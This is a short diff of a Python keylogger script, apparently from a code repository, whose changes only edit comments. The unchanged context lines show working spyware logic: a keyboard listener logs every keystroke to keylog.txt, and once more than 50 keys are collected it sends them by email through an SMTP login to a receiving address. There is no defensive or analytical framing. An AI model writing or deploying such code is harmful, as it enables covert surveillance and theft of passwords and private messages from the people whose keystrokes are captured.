@@ -13,7 +13,7 @@ count = 0
 # Logging file
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
-# Recording key presses
+# Keystrokes detected
 def on_press(key):
     global keys, count
     logging.info(str(key))
@@ -23,6 +23,7 @@ def on_press(key):
     count+=1
     # Key limit, change after testing over
     if count > 50:
+        # Reset key count
         count = 0
         email(keys)
         # Clear keys array after sending email
@@ -59,6 +60,6 @@ def sendEmail(message):
         server.login(senderEmail, password)
         server.sendmail(senderEmail, receiverEmail, message)
 
-
+# Record keystrokes
 with Listener(on_press=on_press) as listener :
     listener.join()
